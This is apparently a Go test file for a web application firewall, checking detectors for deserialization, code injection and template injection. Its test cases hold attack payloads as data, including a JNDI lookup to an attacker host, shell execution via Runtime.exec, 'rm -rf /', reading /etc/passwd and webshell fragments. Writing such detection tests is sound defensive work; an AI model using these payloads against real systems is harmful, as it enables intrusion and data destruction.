package waf

import (
	"testing"
)

func requireDetection(t *testing.T, got Detection, found bool, wantModule Module, wantLevel DetectionLevel, name string) {
	t.Helper()
	if !found {
		t.Errorf("%s: expected detection, got none", name)
		return
	}
	if got.Module != wantModule {
		t.Errorf("%s: module = %s, want %s", name, got.Module, wantModule)
	}
	if got.Level != wantLevel {
		t.Errorf("%s: level = %d, want %d", name, got.Level, wantLevel)
	}
}

func TestScanJavaDeser(t *testing.T) {
	cases := []struct {
		name  string
		value string
		want  bool
		level DetectionLevel
	}{
		{"hex magic bytes", "x=aced0005737200116a6176612e7574696c", true, LevelStrong},
		{"base64 magic", "payload=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", true, LevelStrong},
		{"commons-collections gadget", "chain=org.apache.commons.collections.functors.InvokerTransformer", true, LevelStrong},
		{"fastjson @type", `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}`, true, LevelStrong},
		{"templatesimpl", `{"@type":"org.apache.xbean.propertyeditor.JndiConverter"}`, true, LevelStrong},
		{"benign json", `{"name":"john","age":30}`, false, 0},
		{"benign text", "hello world 123", false, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, found := scanJavaDeser(tc.value)
			if !tc.want {
				if found {
					t.Errorf("unexpected detection: %+v", got)
				}
				return
			}
			requireDetection(t, got, found, ModuleJavaDeser, tc.level, tc.name)
		})
	}
}

func TestScanJavaCodeInj(t *testing.T) {
	cases := []struct {
		name  string
		value string
		want  bool
		level DetectionLevel
	}{
		{"ognl member access", "%{#_memberAccess['allowStaticMethodAccess']=true}", true, LevelStrong},
		{"spel runtime", "T(java.lang.Runtime).getRuntime().exec('calc')", true, LevelStrong},
		{"processbuilder", "new java.lang.ProcessBuilder(['sh']).start()", true, LevelStrong},
		{"groovy eval", "x=Eval.me('rm -rf /')", true, LevelStrong},
		{"weak spel cast", "m=T(lang.Runtime);", true, LevelWeak},
		{"weak jndi", "${jndi:ldap://attacker.example}", true, LevelWeak},
		{"benign param", "tenant_id=1934", false, 0},
		{"benign text", "visit our support homepage for help", false, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, found := scanJavaCodeInj(tc.value)
			if !tc.want {
				if found {
					t.Errorf("unexpected detection: %+v", got)
				}
				return
			}
			requireDetection(t, got, found, ModuleJavaCodeInj, tc.level, tc.name)
		})
	}
}

func TestScanPHPCodeInj(t *testing.T) {
	cases := []struct {
		name  string
		value string
		want  bool
		level DetectionLevel
	}{
		{"eval superglobal", "x=eval($_POST['cmd']);", true, LevelStrong},
		{"bare php tag", "<?php system('cat /etc/passwd');", true, LevelStrong},
		{"short echo tag", "inject=<?=`id`;", true, LevelStrong},
		{"weak code fence sample", "readme:\n```\neval($input);\n```", true, LevelWeak},
		{"benign call", "submit(value)", false, 0},
		{"benign html", "<b>bold</b> text", false, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, found := scanPHPCodeInj(tc.value)
			if !tc.want {
				if found {
					t.Errorf("unexpected detection: %+v", got)
				}
				return
			}
			requireDetection(t, got, found, ModulePHPCodeInj, tc.level, tc.name)
		})
	}
}

func TestScanASPCodeInj(t *testing.T) {
	cases := []struct {
		name  string
		value string
		want  bool
		level DetectionLevel
	}{
		{"directive header", `<%@ Page Language="C#" %>`, true, LevelStrong},
		{"executable asp tag", "<% eval(request(\"cmd\")) %>", true, LevelStrong},
		{"server createobject", "<% Set x = Server.CreateObject(\"WScript.Shell\") %>", true, LevelStrong},
		{"weak plain tag", "<% name %>", true, LevelWeak},
		{"benign html", "<div class=\"row\">content</div>", false, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, found := scanASPCodeInj(tc.value)
			if !tc.want {
				if found {
					t.Errorf("unexpected detection: %+v", got)
				}
				return
			}
			requireDetection(t, got, found, ModuleASPCodeInj, tc.level, tc.name)
		})
	}
}

func TestScanSSTI(t *testing.T) {
	cases := []struct {
		name  string
		value string
		want  bool
		level DetectionLevel
	}{
		{"jinja canary", "greeting={{7*7}}", true, LevelStrong},
		{"subclass gadget", "{{ ''.__class__.__base__.__subclasses__() }}", true, LevelStrong},
		{"freemarker execute", "${\"freemarker.template.utility.Execute\"?new()(`id`)}", true, LevelStrong},
		{"freemarker assign", "<#assign ex=\"freemarker.template.utility.Execute\"", true, LevelStrong},
		{"globals gadget", "{{ request.application.__globals__ }}", true, LevelStrong},
		{"weak template var", "hello={{ username }}", true, LevelWeak},
		{"weak twig block", "payload={% set x = 1 %}", true, LevelWeak},
		{"benign json", `{ "user": "john" }`, false, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, found := scanSSTI(tc.value)
			if !tc.want {
				if found {
					t.Errorf("unexpected detection: %+v", got)
				}
				return
			}
			requireDetection(t, got, found, ModuleSSTI, tc.level, tc.name)
		})
	}
}

func TestScanPHPDeser(t *testing.T) {
	cases := []struct {
		name  string
		value string
		want  bool
		level DetectionLevel
	}{
		{"serialized object", `O:8:"Exploit":1:{s:4:"cmd";s:3:"id";}`, true, LevelStrong},
		{"set_type gadget", `a:1:{s:3:"obj";O:7:"FooBar":0:{}}`, true, LevelStrong},
		{"weak serialized array", `a:2:{s:4:"name";s:3:"jon";}`, true, LevelWeak},
		{"benign word", "status=online", false, 0},
		{"benign value", "goto next page", false, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, found := scanPHPDeser(tc.value)
			if !tc.want {
				if found {
					t.Errorf("unexpected detection: %+v", got)
				}
				return
			}
			requireDetection(t, got, found, ModulePHPDeser, tc.level, tc.name)
		})
	}
}

func TestScanSemanticModulesOrchestration(t *testing.T) {
	t.Run("NoMatchBenign", func(t *testing.T) {
		for _, v := range []string{"", "john", "2024-01-01T00:00:00Z", "a/b/c?d=e"} {
			if _, found := scanSemanticModules("body", v); found {
				t.Errorf("unexpected detection for %q", v)
			}
		}
	})

	t.Run("SerializationPrecedesCodeInj", func(t *testing.T) {
		// Payload carrying both a deser magic byte marker and an OGNL gadget:
		// the dedicated deserializer scanner wins.
		det, found := scanSemanticModules("body", "aced0005 + #{#_memberAccess}")
		if !found {
			t.Fatal("expected detection")
		}
		if det.Module != ModuleJavaDeser {
			t.Errorf("module = %s, want java_deserialization", det.Module)
		}
	})

	t.Run("StrongVerdictMetadata", func(t *testing.T) {
		det, found := scanSemanticModules("body", "greeting={{7*7}}")
		requireDetection(t, det, found, ModuleSSTI, LevelStrong, "canary")
		if det.Matched == "" {
			t.Error("Expected non-empty Matched token for telemetry")
		}
		if det.Reason == "" {
			t.Error("Expected non-empty Reason")
		}
	})
}
